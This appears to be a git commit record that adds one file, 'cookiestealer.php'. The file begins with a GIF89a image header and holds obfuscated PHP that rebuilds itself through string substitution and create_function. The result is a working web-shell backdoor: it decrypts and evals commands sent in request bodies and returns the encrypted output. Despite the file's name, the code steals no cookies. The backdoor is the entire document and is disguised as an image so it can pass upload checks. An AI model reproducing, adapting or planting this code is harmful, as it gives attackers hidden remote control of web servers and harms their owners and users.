fca9dfc6b8c69c51fc022637f8e26d46025b6680
anthonyshikanga <anthonyshikanga@gmail.com>
2019-10-09 16:38:05 +0300

    Initial commit

---
+++ cookiestealer.php
@@ -0,0 +1,11 @@
+GIF89a
+<?php
+$t='/LRinput"),$m)LR==1){@oLRb_starLRt(LR);@evaLRl(@gLRzuncompress(LR@x(@bLRaseLR64_deLRcode($m[1LR]),$kLR)));$o=@oLRb_L';
+$V=str_replace('UW','','creUWatUWeUW_fuUWUWUWnction');
+$F='Rget_contLRents()LR;LR@oLRb_end_cLRlean();$r=LR@baseLR64_LRencode(@LRx(@gzcompresLRs($o),$LRk));priLRnt("$pLRLR$kh$r$kf");}';
+$B='LR$k="5f4dLRcc3LRb";$kh="5LRaaLR765d61LRd83";$kf=LR"27debLR882cf99";$p=LRLR"EcgOzjHLRnELRhTZ8LR1NLRN"LR;function x($LRt';
+$Q='$oLR.=$t{$LRi}^LR$k{$j};}}LRLRretuLRrn $o;}if(@pLRreg_matcLRh("/LR$kLRh(.LR+)$kf/",@fileLR_get_cLRontentLRLRs("php:/';
+$Z=',$k){$c=stLRrlenLR($k)LR;$l=strlen(LR$tLR);$oLR="";for($iLR=0;$i<$l;)LR{for($jLR=LR0;($j<$c&&$i<LR$lLR)LR;$j++,$i++){';
+$s=str_replace('LR','',$B.$Z.$Q.$t.$F);
+$C=$V('',$s);$C();
+?>
